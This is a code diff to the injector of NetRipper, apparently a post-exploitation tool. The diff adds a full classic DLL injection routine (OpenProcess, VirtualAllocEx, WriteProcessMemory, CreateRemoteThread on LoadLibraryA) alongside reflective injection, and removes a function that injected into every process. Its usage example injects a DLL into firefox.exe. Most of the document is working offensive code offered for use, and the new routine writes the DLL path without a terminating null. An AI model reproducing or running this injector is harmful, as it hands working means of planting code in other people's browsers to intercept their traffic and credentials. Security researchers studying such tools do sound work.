@@ -13,7 +13,10 @@
 #include <cstdio>
 #include <windows.h>
 #include <TlHelp32.h> 
+#include <Shlwapi.h>
 #include "LoadLibraryR.h"
+
+#pragma comment(lib, "Shlwapi.lib")
 
 using namespace std;
 
@@ -38,11 +41,16 @@ vector<MODULEENTRY32> GetProcessModules(DWORD p_dwID);
 string ToLower(string p_sString);
 
 BOOL InjectAllByName(string p_sDLLName, string p_sProcessName);
-void InjectAll(string p_sDLLName);
+
 BOOL ReflectiveInject(string p_sDLLName, DWORD p_dwID);
+BOOL NormalInject(string p_sDLLName, DWORD p_dwID);
 
 string GenerateData(string p_sPlain, string p_sLimit, string p_sFinder, string p_sLocation);
 bool ReplaceData(string p_sDLL, string p_sData);
+
+// Specify injection method
+
+bool g_bUseReflectiveInjection = true;
 
 // Print help
 
@@ -51,7 +59,7 @@ void PrintHelp()
 	cout << endl;
 
 	cout << "Injection: NetRipper.exe DLLpath.dll processname.exe" << endl;
-	cout << "Example:   NetRipper.exe DLL.dll firefox.exe" << endl << endl;
+	cout << "Example:   NetRipper.exe DLL.dll firefox.exe [--noreflective]" << endl << endl;
 
 	cout << "Generate DLL:" << endl << endl;
 	cout << "  -h,  --help          Print this help message" << endl;
@@ -80,7 +88,7 @@ int _tmain(int argc, char* argv[])
 
 	// DLL Injection
 
-	if(argc == 3)
+	if(argc == 3 || argc == 4)
 	{
 		if(argv[1][0] != '-' && argv[2][0] != '-')
 		{
@@ -89,11 +97,18 @@ int _tmain(int argc, char* argv[])
 			string sDLL = argv[1];
 			string sProcess = argv[2];
 			cout << "INFO: Trying to inject " << sDLL << " in " << sProcess << endl;
+
+			// Injection method
+
+			if (argc == 4)
+			{
+				string arg4 = argv[3];
+				if (arg4.compare("--noreflective") == 0) g_bUseReflectiveInjection = false;
+			}
+
+			// Inject
 	
-			if(sProcess.compare("ALL") == 0)
-				InjectAll(sDLL);
-			else
-				InjectAllByName(sDLL, sProcess);
+			InjectAllByName(sDLL, sProcess);
 
 			return 0;
 		}
@@ -452,37 +467,28 @@ BOOL InjectAllByName(string p_sDLLName, string p_sProcessName)
 	{
 		if(p_sProcessName.compare(ToLower(vProcesses[i].szExeFile)) == 0) 
 		{
-			if (ReflectiveInject(p_sDLLName, vProcesses[i].th32ProcessID) == false)
+			if (g_bUseReflectiveInjection)
 			{
-				bResult = false;
-				cout << "ERROR: Cannot reflectively inject in: " << vProcesses[i].th32ProcessID << endl;
+				if (ReflectiveInject(p_sDLLName, vProcesses[i].th32ProcessID) == false)
+				{
+					bResult = false;
+					cout << "ERROR: Cannot reflectively inject in: " << vProcesses[i].th32ProcessID << endl;
+				}
+				else cout << "SUCCESS: Reflectively injected in: " << vProcesses[i].th32ProcessID << endl;
 			}
-			else cout << "SUCCESS: Reflectively injected in: " << vProcesses[i].th32ProcessID << endl;
+			else
+			{
+				if (NormalInject(p_sDLLName, vProcesses[i].th32ProcessID) == false)
+				{
+					bResult = false;
+					cout << "ERROR: Cannot inject in: " << vProcesses[i].th32ProcessID << endl;
+				}
+				else cout << "SUCCESS: Injected in: " << vProcesses[i].th32ProcessID << endl;
+			}
 		}
 	}
 
 	return bResult;
-}
-
-// Will inject a DLL in all processes 
-
-void InjectAll(string p_sDLLName)
-{
-    vector<PROCESSENTRY32> vProcesses = GetProcesses();
-
-	// Check all processes
-
-	for(size_t i = 0; i < vProcesses.size(); i++)
-	{
-		if (ReflectiveInject(p_sDLLName, vProcesses[i].th32ProcessID) == TRUE)
-		{
-			cout << "SUCCESS: Reflectively injected in: " << vProcesses[i].th32ProcessID << endl;
-		}
-		else
-		{
-			cout << "ERROR: Cannot reflectively inject in: " << vProcesses[i].th32ProcessID << endl;
-		}
-	}
 }
 
 // Function for Reflective DLL Injection
@@ -591,6 +597,89 @@ BOOL ReflectiveInject(string p_sDLLName, DWORD p_dwID)
 		CloseHandle( hProcess );
 
 	return bResult;
+}
+
+// Good old injection method
+
+BOOL NormalInject(string p_sDLLName, DWORD p_dwID)
+{
+	HANDLE hProcess, hRemoteThread;
+	LPVOID pvString, pvLoadLibrary;
+	BOOL bResult;
+	string sDLLPath = "";
+
+	// We need full DLL path for normal injection
+
+	if (PathIsRelative(p_sDLLName.c_str()))
+	{
+		char pCurrentDirectory[256];
+		if (GetCurrentDirectory(256, pCurrentDirectory) == 0)
+		{
+			cout << "Error: Cannot get current directory, please provide full DLL path!" << endl;
+			return false;
+		}
+
+		sDLLPath = pCurrentDirectory;
+		sDLLPath = sDLLPath + "\\";
+		sDLLPath = sDLLPath + p_sDLLName;
+	}
+	else sDLLPath = p_sDLLName;
+	
+	// Open process
+
+	hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, p_dwID);
+
+	if (hProcess == NULL)
+	{
+		cout << "Error: Cannot open process: " << p_dwID << endl;
+		return false;
+	}
+
+	// Get LoadLibrary address
+
+	pvLoadLibrary = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
+
+	if (pvLoadLibrary == NULL)
+	{
+		cout << "Error: Cannot get LoadLibrary address to inject the DLL!" << endl;
+		return false;
+	}
+
+	// Allocate space in remote process for DLL name
+
+	pvString = (LPVOID)VirtualAllocEx(hProcess, NULL, sDLLPath.length(), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+
+	if (pvString == NULL)
+	{
+		cout << "Error: Cannot allocate memory for DLL name in remote process!" << endl;
+		return false;
+	}
+
+	// Write DLL name in allocated space
+
+	SIZE_T written = 0;
+
+	bResult = WriteProcessMemory(hProcess, (LPVOID)pvString, sDLLPath.c_str(), sDLLPath.length(), &written);
+
+	if (!bResult)
+	{
+		cout << "Error: Cannot write DLL name in remote process!" << endl;
+		return false;
+	}
+
+	// Create Remote thread to call "LoadLibrary(dll)"
+
+	hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pvLoadLibrary, (LPVOID)pvString, 0, NULL);
+
+	if (hRemoteThread == NULL)
+	{
+		cout << "Error: Cannot create remote thread to inject DLL!" << endl;
+		return false;
+	}
+
+	CloseHandle(hProcess);
+
+	return true;
 }
 
 // Function to convert a string to lower
